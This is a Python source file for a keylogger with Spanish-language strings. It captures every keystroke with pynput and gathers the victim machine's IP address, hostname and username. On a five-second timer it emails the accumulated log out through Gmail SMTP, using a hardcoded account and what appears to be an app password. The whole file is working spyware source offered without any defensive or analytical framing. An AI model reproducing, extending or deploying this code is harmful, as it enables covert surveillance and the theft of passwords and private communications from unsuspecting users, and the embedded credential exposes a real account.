#!/usr/bin/env python3
import threading
import pynput.keyboard
import smtplib
import socket
import os
from termcolor import colored
from email.mime.text import MIMEText

class Keylogger:
    def __init__(self):
        self.log = ""
        self.request_shutdown = False
        self.timer = None
        self.is_first_run = True

    def obtener_info_equipo(self):
        nombre_equipo = socket.gethostname()
        try:
            ip_equipo = socket.gethostbyname(nombre_equipo)
        except socket.gaierror:
            ip_equipo = "No se pudo obtener la IP"
        usuario = os.getlogin()
        return f"IP del equipo: {ip_equipo}\nNombre del equipo: {nombre_equipo}\nUsuario activo: {usuario}\n\n"

    def pressed_key(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            special_keys = {
                key.space: " ",
                key.backspace: " Backspace ",
                key.enter: " Enter ",
                key.shift: " Shift ",
                key.alt: " Alt ",
                key.ctrl: " Ctrl ",
            }
            self.log += special_keys.get(key, f" {str(key)} ")

    def send_email(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        try:
            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
                smtp_server.login(sender, password)
                smtp_server.sendmail(sender, recipients, msg.as_string())
            print(colored(f"\n[+] Email sent Successfully!\n", 'yellow'))
        except Exception as e:
            print(colored(f"\n[-] Failed to send email: {str(e)}\n", 'red'))

    def report(self):
        if self.is_first_run:
            equipo_info = self.obtener_info_equipo()
            email_body = equipo_info + "[+] El keylogger se ha iniciado exitosamente\n" + self.log
        else:
            email_body = self.log

		# Asunto + Origen + Destino + Clave de aplicación
        self.send_email(
            "Keylogger Report", 
            email_body,
            "frib1thack@gmail.com",
            ["frib1thack@gmail.com"],
            "mfsr zeml echt hbbh"
        )
        self.log = ""

        if self.is_first_run:
            self.is_first_run = False

        if not self.request_shutdown:
            self.timer = threading.Timer(5, self.report)
            self.timer.start()

    def shutdown(self):
        self.request_shutdown = True
        if self.timer:
            self.timer.cancel()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
